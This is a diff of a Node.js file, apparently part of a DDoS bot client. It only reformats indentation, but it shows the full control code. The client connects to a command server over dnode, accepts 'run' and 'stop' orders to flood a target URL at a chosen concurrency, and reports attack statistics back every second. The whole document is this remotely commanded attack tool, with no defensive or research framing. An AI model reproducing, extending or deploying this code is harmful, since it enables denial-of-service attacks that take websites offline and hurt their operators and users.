@@ -21,26 +21,26 @@ var dnode = require('dnode'),
  */
 
 var d = dnode({
-	run: function (url, concurent){
-		ddos.runningState = true;
-		ddos.resetStats();
-		ddos.run(url,concurent);
-		console.log('DDoS started');
-	},
-	stop: function (){
-		console.log("Terminating DDoS");
-		ddos.runningState = false;
-	}
+    run: function (url, concurent){
+        ddos.runningState = true;
+        ddos.resetStats();
+        ddos.run(url,concurent);
+        console.log('DDoS started');
+    },
+    stop: function (){
+        console.log("Terminating DDoS");
+        ddos.runningState = false;
+    }
 }).connect(config.server,config.port, function(remote,conn){
     console.log('=> We are connected to the server! Sending ping...');
 
     function reqStats(){
-    	if(ddos.runningState){
-    		remote.stats(ddos.stats);
-    	}
-		stats = setTimeout(reqStats,1000);
-	}
-	var stats = setTimeout(reqStats,1000);
+        if(ddos.runningState){
+            remote.stats(ddos.stats);
+        }
+        stats = setTimeout(reqStats,1000);
+    }
+    var stats = setTimeout(reqStats,1000);
 });
 
 
